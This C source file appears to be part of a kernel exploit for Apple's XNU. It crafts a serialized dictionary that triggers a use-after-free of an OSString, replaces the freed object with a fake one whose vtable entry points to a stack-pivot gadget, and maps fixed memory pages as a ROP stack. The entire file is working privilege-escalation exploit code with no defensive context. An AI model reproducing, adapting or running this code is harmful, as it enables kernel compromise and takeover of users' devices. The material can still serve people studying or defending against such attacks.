#include <stdint.h>             // uint32_t

#include <mach/kern_return.h>   // kern_return_t, KERN_SUCCESS
#include <mach/mach_error.h>    // mach_error_string
#include <mach/mach_init.h>
#include <mach/vm_map.h>

#include "common.h"             // DEBUG, PRINT_BUF, file_t
#include "io.h"                 // kOS*, OSString, dict_parse
#include "rop.h"                // get_stack_pivot
#include "slide.h"              // get_kernel_slide

#include "uaf_rop.h"

void uaf_parse(const OSString *fake)
{
    DEBUG("Using UAF to gain PC control...");

    const uint32_t *data = (const uint32_t*)fake;
    PRINT_BUF("Data", data, sizeof(OSString));

    const char str[4] = "str",
               ref[4] = "ref";
    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        kOSSerializeMagic,                                          // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries

        kOSSerializeString | 4,                                     // String that will get freed
        *((uint32_t*)str),
        kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                    // vtable pointer (lower half)
        data[1],                                                    // vtable pointer (upper half)
        data[2],                                                    // retainCount
        data[3],                                                    // flags
        data[4],                                                    // length
        data[5],                                                    // (padding)
        data[6],                                                    // string pointer (lower half)
        data[7],                                                    // string pointer (upper half)
#else
        data[0],                                                    // vtable pointer
        data[1],                                                    // retainCount
        data[2],                                                    // flags
        data[3],                                                    // length
        data[4],                                                    // string pointer
#endif

        kOSSerializeSymbol | 4,                                     // Whatever name for our reference
        *((uint32_t*)ref),
        kOSSerializeEndCollection | kOSSerializeObject | 1,         // Reference to object 1 (OSString)
    };
    PRINT_BUF("Dict", dict, sizeof(dict));

    dict_parse(dict, sizeof(dict));
}

// Don't risk deallocating this once we acquire it
void** uaf_rop_stack(void)
{
    static void **ptr = NULL;
    if(ptr == NULL)
    {
        kern_return_t ret;
        vm_size_t page_size = 0;
        host_page_size(mach_host_self(), &page_size);
        DEBUG("Page size: 0x%llx", (unsigned long long)page_size);

        vm_address_t addr = kOSSerializeObject, // dark magic
                     backup = addr - page_size;

        DEBUG("Allocating ROP error buffer page at 0x%llx", (unsigned long long)backup);
        ret = vm_allocate(mach_task_self(), &backup, page_size, 0);
        if(ret != KERN_SUCCESS)
        {
            THROW("Failed allocate page at 0x%llx (%s)", (unsigned long long)backup, mach_error_string(ret));
        }

        DEBUG("Allocating ROP stack page at 0x%llx", (unsigned long long)addr);
        ret = vm_allocate(mach_task_self(), &addr, page_size, 0);
        if(ret != KERN_SUCCESS)
        {
            THROW("Failed allocate page at 0x%llx (%s)", (unsigned long long)addr, mach_error_string(ret));
        }
        DEBUG("Allocated ROP pages at 0x%llx and 0x%llx", (unsigned long long)backup, (unsigned long long)addr);
        ptr = (void**)addr;
    }
    return ptr;
}

void uaf_rop(file_t *kernel)
{
    DEBUG("Executing ROP chain...");

    // TODO: copy actual vtab
    void *vtab[5] =
    {
        (void*)0x0,
        (void*)0x0,
        (void*)0x0,
        (void*)0x0,
        get_stack_pivot(kernel),
    };
    OSString osstr =
    {
        .vtab = (vtab_t)vtab,
        .retainCount = 100,
        .flags = kOSStringNoCopy,
        .length = 0,
        .string = NULL,
    };

    uaf_parse(&osstr);
}
